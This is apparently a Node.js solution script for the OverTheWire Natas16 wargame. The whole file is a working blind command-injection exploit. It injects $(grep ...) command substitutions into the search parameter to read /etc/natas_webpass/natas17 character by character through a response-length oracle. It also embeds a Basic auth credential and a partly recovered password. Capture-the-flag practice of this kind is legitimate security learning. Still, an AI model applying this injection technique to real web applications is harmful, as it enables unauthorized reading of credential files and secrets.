const request = require("request")
const { parse } = require("node-html-parser")

const url = "http://natas16.natas.labs.overthewire.org/index.php"

async function serveRequest(needle) {
  const formData = {
    submit: "Search",
  }

  return new Promise((res, rej) => {
    request.post(
      {
        url: url + "/?needle=" + needle,
        formData: formData,
        headers: {
          Authorization:
            "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==",
        },
      },
      function optionalCallback(err, httpResponse, body) {
        if (err) {
          console.log(err)
          res(-1)
        }
        res(body)
      }
    )
  })
}

const digits = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
function doesCharExist(htmlStr) {
  // function getMessage() {
  //   const root = parse(htmlStr)
  //   return root.querySelector("pre").text
  // }
  if (htmlStr[2000]) {
    return false
  }
  return true
}

;(async function () {
  let crackedPass = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9"
  const length = crackedPass.length
  // const r = await serveRequest("$(grep a /etc/natas_webpass/natas17)")
  // console.log(doesCharExist(r))

  for (var i = 0; i < 32 - length; i++) {
    let found = false

    console.log("starting checking the digits : ")
    for (var d in digits) {
      const command = `$(grep ^${crackedPass}${digits[d]} /etc/natas_webpass/natas17)`
      console.log("testing digit " + digits[d])
      const r = await serveRequest(command)
      const strExists = doesCharExist(r)

      if (strExists === true) {
        crackedPass = crackedPass + digits[d]
        found = true
        break
      }
    }

    if (!found) {
      console.log("ERR", "couldnt find")
      return
    } else {
      console.log("crackedPass = " + crackedPass)
    }
  }
})()
